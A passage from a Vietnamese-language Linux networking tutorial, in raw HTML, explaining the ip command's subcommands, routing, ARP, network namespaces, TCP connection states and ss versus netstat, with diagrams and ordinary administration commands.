<a href=#object-ch%c3%adnh class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h1><p>link # Network interface (layer 2)
addr # IP address (layer 3)
route # Routing table
neigh # ARP/neighbor cache
netns # Network namespaces
tunnel # IP tunnels</p><h1 class=heading-element id=options-hay-dùng><span>OPTIONS hay dùng:</span>
<a href=#options-hay-d%c3%b9ng class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h1><p>-c # Color output
-br # Brief output
-s # Statistics
-4/-6 # IPv4/IPv6 only</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>
</span></span><span class=line><span class=cl>### 1.3 ip link - Quản Lý Interface
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>```bash
</span></span><span class=line><span class=cl># Liệt kê interfaces
</span></span><span class=line><span class=cl>ip link show
</span></span><span class=line><span class=cl>ip -br link show              # Brief: tên, state, MAC
</span></span><span class=line><span class=cl>ip -s link show eth0          # Statistics
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Output:
</span></span><span class=line><span class=cl># 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP
</span></span><span class=line><span class=cl>#     link/ether 00:11:22:33:44:55 brd ff:ff:ff:ff:ff:ff
</span></span><span class=line><span class=cl>#     RX: bytes  packets  errors  dropped
</span></span><span class=line><span class=cl>#     1234567    12345    0       0
</span></span><span class=line><span class=cl>#     TX: bytes  packets  errors  dropped
</span></span><span class=line><span class=cl>#     7654321    54321    0       0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Bật/tắt interface
</span></span><span class=line><span class=cl>ip link set eth0 up
</span></span><span class=line><span class=cl>ip link set eth0 down
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Đổi MTU (Maximum Transmission Unit)
</span></span><span class=line><span class=cl>ip link set eth0 mtu 9000     # Jumbo frames
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Đổi MAC address
</span></span><span class=line><span class=cl>ip link set eth0 address 00:11:22:33:44:66
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Tạo virtual interface
</span></span><span class=line><span class=cl>ip link add veth0 type veth peer name veth1    # Virtual ethernet pair
</span></span><span class=line><span class=cl>ip link add br0 type bridge                     # Bridge
</span></span><span class=line><span class=cl>ip link add bond0 type bond                     # Bonding</span></span></code></pre></div><h3 class=heading-element id=14-ip-addr---quản-lý-ip-address><span>1.4 ip addr - Quản Lý IP Address</span>
<a href=#14-ip-addr---qu%e1%ba%a3n-l%c3%bd-ip-address class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Liệt kê IP</span>
</span></span><span class=line><span class=cl>ip addr show
</span></span><span class=line><span class=cl>ip -br addr show              <span class=c1># Brief</span>
</span></span><span class=line><span class=cl>ip addr show eth0             <span class=c1># Specific interface</span>
</span></span><span class=line><span class=cl>ip -4 addr show               <span class=c1># IPv4 only</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Thêm IP</span>
</span></span><span class=line><span class=cl>ip addr add 192.168.1.100/24 dev eth0
</span></span><span class=line><span class=cl>ip addr add 192.168.1.101/24 dev eth0    <span class=c1># Thêm secondary IP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xóa IP</span>
</span></span><span class=line><span class=cl>ip addr del 192.168.1.100/24 dev eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Flush tất cả IP của interface</span>
</span></span><span class=line><span class=cl>ip addr flush dev eth0</span></span></code></pre></div><h3 class=heading-element id=15-ip-route---routing-table><span>1.5 ip route - Routing Table</span>
<a href=#15-ip-route---routing-table class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│              ROUTING TABLE &amp; LONGEST PREFIX MATCH           │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Routing = Thuật toán LONGEST PREFIX MATCH
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ví dụ routing table:
</span></span><span class=line><span class=cl>┌─────────────────────┬────────────────┬───────────┐
</span></span><span class=line><span class=cl>│ Destination         │ Gateway        │ Interface │
</span></span><span class=line><span class=cl>├─────────────────────┼────────────────┼───────────┤
</span></span><span class=line><span class=cl>│ 192.168.1.0/24      │ 0.0.0.0        │ eth0      │
</span></span><span class=line><span class=cl>│ 10.0.0.0/8          │ 192.168.1.1    │ eth0      │
</span></span><span class=line><span class=cl>│ 10.10.0.0/16        │ 192.168.1.2    │ eth0      │
</span></span><span class=line><span class=cl>│ 10.10.10.0/24       │ 192.168.1.3    │ eth0      │
</span></span><span class=line><span class=cl>│ 0.0.0.0/0 (default) │ 192.168.1.254  │ eth0      │
</span></span><span class=line><span class=cl>└─────────────────────┴────────────────┴───────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Packet đến 10.10.10.5 → Match routes nào?
</span></span><span class=line><span class=cl><span class=k>-</span> 10.0.0.0/8       ✓ Match (prefix /8)
</span></span><span class=line><span class=cl><span class=k>-</span> 10.10.0.0/16     ✓ Match (prefix /16)
</span></span><span class=line><span class=cl><span class=k>-</span> 10.10.10.0/24    ✓ Match (prefix /24) ← LONGEST, chọn cái này!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Thuật toán: O(n) với linear search, O(log n) với trie/radix tree
</span></span><span class=line><span class=cl>Kernel Linux dùng: LPC-trie (Level-Compressed Trie)</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Xem routing table</span>
</span></span><span class=line><span class=cl>ip route show
</span></span><span class=line><span class=cl>ip route show table all       <span class=c1># Tất cả tables</span>
</span></span><span class=line><span class=cl>ip -6 route show              <span class=c1># IPv6</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Output:</span>
</span></span><span class=line><span class=cl><span class=c1># default via 192.168.1.1 dev eth0 proto dhcp metric 100</span>
</span></span><span class=line><span class=cl><span class=c1># 192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Thêm route</span>
</span></span><span class=line><span class=cl>ip route add 10.0.0.0/8 via 192.168.1.1
</span></span><span class=line><span class=cl>ip route add 10.0.0.0/8 via 192.168.1.1 dev eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Thêm default gateway</span>
</span></span><span class=line><span class=cl>ip route add default via 192.168.1.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xóa route</span>
</span></span><span class=line><span class=cl>ip route del 10.0.0.0/8
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Thay đổi route</span>
</span></span><span class=line><span class=cl>ip route change 10.0.0.0/8 via 192.168.1.2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xem route cho destination cụ thể</span>
</span></span><span class=line><span class=cl>ip route get 8.8.8.8
</span></span><span class=line><span class=cl><span class=c1># 8.8.8.8 via 192.168.1.1 dev eth0 src 192.168.1.100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Policy routing (multiple tables)</span>
</span></span><span class=line><span class=cl>ip rule add from 192.168.2.0/24 table <span class=m>100</span>
</span></span><span class=line><span class=cl>ip route add default via 10.0.0.1 table <span class=m>100</span></span></span></code></pre></div><h3 class=heading-element id=16-ip-neigh---arp-cache><span>1.6 ip neigh - ARP Cache</span>
<a href=#16-ip-neigh---arp-cache class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                    ARP PROTOCOL                             │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ARP = Address Resolution Protocol
</span></span><span class=line><span class=cl>Chuyển IP (Layer 3) → MAC (Layer 2)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>           Host A                              Host B
</span></span><span class=line><span class=cl>      192.168.1.10                         192.168.1.20
</span></span><span class=line><span class=cl>      AA:AA:AA:AA:AA:AA                    BB:BB:BB:BB:BB:BB
</span></span><span class=line><span class=cl>            │                                    │
</span></span><span class=line><span class=cl>            │  ARP Request (broadcast)           │
</span></span><span class=line><span class=cl>            │  &#34;Who has 192.168.1.20?&#34;           │
</span></span><span class=line><span class=cl>            │ ─────────────────────────────────► │
</span></span><span class=line><span class=cl>            │                                    │
</span></span><span class=line><span class=cl>            │  ARP Reply (unicast)               │
</span></span><span class=line><span class=cl>            │  &#34;192.168.1.20 is at BB:BB:...&#34;    │
</span></span><span class=line><span class=cl>            │ ◄───────────────────────────────── │
</span></span><span class=line><span class=cl>            │                                    │
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ARP Cache: Hash table để tra cứu nhanh
</span></span><span class=line><span class=cl><span class=k>-</span> Key: IP address
</span></span><span class=line><span class=cl><span class=k>-</span> Value: MAC address + timestamp
</span></span><span class=line><span class=cl><span class=k>-</span> Lookup: O(1) average
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Tấn công ARP Spoofing: Gửi ARP reply giả để redirect traffic</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Xem ARP cache</span>
</span></span><span class=line><span class=cl>ip neigh show
</span></span><span class=line><span class=cl>arp -a                        <span class=c1># Cách cũ</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Output:</span>
</span></span><span class=line><span class=cl><span class=c1># 192.168.1.1 dev eth0 lladdr 00:11:22:33:44:55 REACHABLE</span>
</span></span><span class=line><span class=cl><span class=c1># 192.168.1.2 dev eth0 lladdr 00:11:22:33:44:66 STALE</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># States:</span>
</span></span><span class=line><span class=cl><span class=c1># REACHABLE - Đã xác nhận gần đây</span>
</span></span><span class=line><span class=cl><span class=c1># STALE     - Hết hạn, cần verify lại</span>
</span></span><span class=line><span class=cl><span class=c1># DELAY     - Đang chờ verify</span>
</span></span><span class=line><span class=cl><span class=c1># PROBE     - Đang gửi probe</span>
</span></span><span class=line><span class=cl><span class=c1># FAILED    - Không resolve được</span>
</span></span><span class=line><span class=cl><span class=c1># PERMANENT - Static entry</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Thêm static entry</span>
</span></span><span class=line><span class=cl>ip neigh add 192.168.1.50 lladdr 00:11:22:33:44:77 dev eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xóa entry</span>
</span></span><span class=line><span class=cl>ip neigh del 192.168.1.50 dev eth0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Flush cache</span>
</span></span><span class=line><span class=cl>ip neigh flush dev eth0</span></span></code></pre></div><h3 class=heading-element id=17-network-namespaces><span>1.7 Network Namespaces</span>
<a href=#17-network-namespaces class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                NETWORK NAMESPACES                           │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Namespace = Isolated network stack
</span></span><span class=line><span class=cl>Docker/Kubernetes dùng để isolate container networking
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│                    Host                                     │
</span></span><span class=line><span class=cl>│  ┌─────────────────┐          ┌─────────────────┐           │
</span></span><span class=line><span class=cl>│  │   Namespace A   │          │   Namespace B   │           │
</span></span><span class=line><span class=cl>│  │                 │          │                 │           │
</span></span><span class=line><span class=cl>│  │  eth0: 10.0.1.1 │          │  eth0: 10.0.2.1 │           │
</span></span><span class=line><span class=cl>│  │  routing table  │          │  routing table  │           │
</span></span><span class=line><span class=cl>│  │  iptables rules │          │  iptables rules │           │
</span></span><span class=line><span class=cl>│  │                 │          │                 │           │
</span></span><span class=line><span class=cl>│  └────────┬────────┘          └────────┬────────┘           │
</span></span><span class=line><span class=cl>│           │      veth pair             │                    │
</span></span><span class=line><span class=cl>│           └────────────┬───────────────┘                    │
</span></span><span class=line><span class=cl>│                        │                                    │
</span></span><span class=line><span class=cl>│                   ┌────┴────┐                               │
</span></span><span class=line><span class=cl>│                   │  Bridge │                               │
</span></span><span class=line><span class=cl>│                   └────┬────┘                               │
</span></span><span class=line><span class=cl>│                        │                                    │
</span></span><span class=line><span class=cl>│                   ┌────┴────┐                               │
</span></span><span class=line><span class=cl>│                   │  eth0   │ ← Physical interface          │
</span></span><span class=line><span class=cl>│                   └─────────┘                               │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Tạo namespace</span>
</span></span><span class=line><span class=cl>ip netns add ns1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Liệt kê namespaces</span>
</span></span><span class=line><span class=cl>ip netns list
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Chạy command trong namespace</span>
</span></span><span class=line><span class=cl>ip netns <span class=nb>exec</span> ns1 ip addr show
</span></span><span class=line><span class=cl>ip netns <span class=nb>exec</span> ns1 bash         <span class=c1># Shell trong namespace</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tạo veth pair và kết nối</span>
</span></span><span class=line><span class=cl>ip link add veth0 <span class=nb>type</span> veth peer name veth1
</span></span><span class=line><span class=cl>ip link <span class=nb>set</span> veth1 netns ns1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Cấu hình IP trong namespace</span>
</span></span><span class=line><span class=cl>ip addr add 10.0.0.1/24 dev veth0
</span></span><span class=line><span class=cl>ip link <span class=nb>set</span> veth0 up
</span></span><span class=line><span class=cl>ip netns <span class=nb>exec</span> ns1 ip addr add 10.0.0.2/24 dev veth1
</span></span><span class=line><span class=cl>ip netns <span class=nb>exec</span> ns1 ip link <span class=nb>set</span> veth1 up
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Test connectivity</span>
</span></span><span class=line><span class=cl>ip netns <span class=nb>exec</span> ns1 ping 10.0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Xóa namespace</span>
</span></span><span class=line><span class=cl>ip netns del ns1</span></span></code></pre></div><hr><h2 class=heading-element id=phần-2-ssnetstat---socket-statistics><span>PHẦN 2: SS/NETSTAT - SOCKET STATISTICS</span>
<a href=#ph%e1%ba%a7n-2-ssnetstat---socket-statistics class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=21-tcp-connection-states><span>2.1 TCP Connection States</span>
<a href=#21-tcp-connection-states class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>┌─────────────────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│             TCP STATE MACHINE (Finite Automaton)            │
</span></span><span class=line><span class=cl>└─────────────────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>               ┌──────────────────────────────────────────┐
</span></span><span class=line><span class=cl>               │           TCP 3-Way Handshake            │
</span></span><span class=line><span class=cl>               └──────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      Client                                        Server
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>        │              SYN (seq=x)                     │
</span></span><span class=line><span class=cl>   SYN_SENT ──────────────────────────────────────► LISTEN
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>        │         SYN+ACK (seq=y, ack=x+1)             │
</span></span><span class=line><span class=cl>        │ ◄────────────────────────────────────── SYN_RECEIVED
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>        │            ACK (ack=y+1)                     │
</span></span><span class=line><span class=cl>   ESTABLISHED ───────────────────────────────────► ESTABLISHED
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>        │         ← Data Transfer →                    │
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>               ┌──────────────────────────────────────────┐
</span></span><span class=line><span class=cl>               │           TCP 4-Way Teardown             │
</span></span><span class=line><span class=cl>               └──────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      Client                                        Server
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>        │              FIN (seq=x)                     │
</span></span><span class=line><span class=cl>   FIN_WAIT_1 ────────────────────────────────────► CLOSE_WAIT
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>        │            ACK (ack=x+1)                     │
</span></span><span class=line><span class=cl>   FIN_WAIT_2 ◄────────────────────────────────────    │
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>        │              FIN (seq=y)                     │
</span></span><span class=line><span class=cl>        │ ◄──────────────────────────────────────── LAST_ACK
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>        │            ACK (ack=y+1)                     │
</span></span><span class=line><span class=cl>   TIME_WAIT ──────────────────────────────────────► CLOSED
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>     (2*MSL)                                           │
</span></span><span class=line><span class=cl>        │                                              │
</span></span><span class=line><span class=cl>     CLOSED                                            │
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TCP States (có thể observe bằng ss):
</span></span><span class=line><span class=cl>┌─────────────┬────────────────────────────────────────────────┐
</span></span><span class=line><span class=cl>│ State       │ Ý nghĩa                                        │
</span></span><span class=line><span class=cl>├─────────────┼────────────────────────────────────────────────┤
</span></span><span class=line><span class=cl>│ LISTEN      │ Server đang chờ connection                     │
</span></span><span class=line><span class=cl>│ SYN_SENT    │ Client đã gửi SYN, chờ SYN+ACK                 │
</span></span><span class=line><span class=cl>│ SYN_RECV    │ Server nhận SYN, đã gửi SYN+ACK, chờ ACK       │
</span></span><span class=line><span class=cl>│ ESTABLISHED │ Connection hoàn tất, đang transfer data        │
</span></span><span class=line><span class=cl>│ FIN_WAIT_1  │ Đã gửi FIN, chờ ACK                            │
</span></span><span class=line><span class=cl>│ FIN_WAIT_2  │ Nhận ACK cho FIN, chờ FIN từ peer              │
</span></span><span class=line><span class=cl>│ TIME_WAIT   │ Chờ 2*MSL trước khi đóng hoàn toàn             │
</span></span><span class=line><span class=cl>│ CLOSE_WAIT  │ Nhận FIN, chờ application close                │
</span></span><span class=line><span class=cl>│ LAST_ACK    │ Đã gửi FIN, chờ ACK cuối                       │
</span></span><span class=line><span class=cl>│ CLOSING     │ Cả hai bên gửi FIN cùng lúc (hiếm)             │
</span></span><span class=line><span class=cl>└─────────────┴────────────────────────────────────────────────┘
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TIME_WAIT kéo dài 2*MSL (Maximum Segment Lifetime, thường 60s)
</span></span><span class=line><span class=cl>→ Nếu server restart nhanh, có thể bị &#34;Address already in use&#34;
</span></span><span class=line><span class=cl>→ Giải pháp: SO_REUSEADDR socket option</span></span></code></pre></div><h3 class=heading-element id=22-ss-vs-netstat><span>2.2 ss vs netstat</span>
<a href=#22-ss-vs-netstat class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ss (Socket Statistics) - NHANH hơn, recommend</span>
</span></span><span class=line><span class=cl><span class=c1># netstat - Deprecated nhưng vẫn phổ biến</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Tại sao ss nhanh hơn?</span>
</span></span><span class=line><span class=cl><span class=c1># netstat: Đọc /proc/net/tcp, /proc/net/udp (text parsing)</span>
</span></span><span class=line><span class=cl><span class=c1># ss: Dùng netlink socket (binary protocol, kernel trả về trực tiếp)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Benchmark với 10000 connections:</span>
</span></span><span class=line><span class=cl><span class=c1># netstat: ~2 seconds</span>
</span></span><span class=line><span class=cl><span class=c1># ss:      ~0.1 seconds</span></span></span></code></pre></div><h3 class=heading-element id=23-cú-pháp-ss><span>2.3 Cú Pháp ss</span>
<a href=#23-c%c3%ba-ph%c3%a1p-ss class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ss <span class=o>[</span>options<span class=o>]</span> <span class=o>[</span>filter<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Options:</span>
</span></span><span class=line><span class=cl>-t          <span class=c1># TCP sockets</span>
